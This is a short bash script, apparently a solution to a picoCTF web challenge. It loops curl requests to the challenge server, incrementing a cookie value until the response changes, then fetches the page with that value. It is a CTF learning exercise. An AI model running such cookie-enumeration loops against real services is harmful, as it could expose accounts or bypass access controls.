#!/usr/bin/env bash

count=0

while curl --cookie "name=$count" http://mercury.picoctf.net:54219/check 2>/dev/null | grep "That is a cookie" &>/dev/null
do
	echo "[+] making a GET request with cookie <name=$count> to  http://mercury.picoctf.net:54219/check"
	((count++))

done

echo "Stopped at cookie=$count"
curl --cookie "name=$count" http://mercury.picoctf.net:54219/check
